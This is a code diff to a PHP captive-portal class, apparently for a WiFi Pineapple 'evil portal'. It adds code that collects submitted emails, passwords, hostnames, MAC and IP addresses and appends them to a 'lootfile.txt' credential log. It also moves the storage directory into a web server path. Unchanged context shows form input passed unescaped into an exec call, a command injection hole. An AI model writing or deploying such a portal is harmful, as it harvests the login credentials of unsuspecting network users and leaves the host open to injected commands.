@@ -8,8 +8,13 @@ class MyPortal extends Portal
 
         $dirs = array(
             '/root/',
-            '/sd/',
+            '/opt/lampp/htdocs/',
         );
+        // Original
+        // $dirs = array(
+        //     '/root/',
+        //     '/sd/',
+        // );
 
         $dirs = array_filter($dirs, 'file_exists');
         $dirs = array_filter($dirs, 'is_writeable');
@@ -51,6 +56,26 @@ class MyPortal extends Portal
             exec("pineapple notify $email' - '$pwd");
         }
         // handle form input or other extra things there
+
+        // Store input in variable
+        $email2 = isset($_POST['email']) ? $_POST['email'] : 'email';
+        $pwd2 = isset($_POST['password']) ? $_POST['password'] : 'password';
+        $hostname2 = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
+        $mac2 = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
+        $ip2 = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
+        // Store all input variables in single "$loot" var
+        $loot = "\nEmail: {$email2}\nPassword: {$pwd2}\nHostname: {$hostname2}\nMAC: {$mac2}\nIP: {$ip2}\n";
+
+        // Open || Create file called lootfile.txt
+        $fh = fopen("lootfile.txt", 'r+') or die("failed to create file");
+        // Retrieve current contents of lootfile.txt
+        $filecontent = fgets($fh);
+        // Move cursor to the end of lootfile's contents
+        fseek($fh, 0, SEEK_END);
+        // Write the contents of "$loot" to lootfile.txt
+        fwrite($fh, $loot) or die('Could not write to file');
+        // Close the file
+        fclose();
 
         // Call parent to handle basic authorization first
         parent::handleAuthorization();
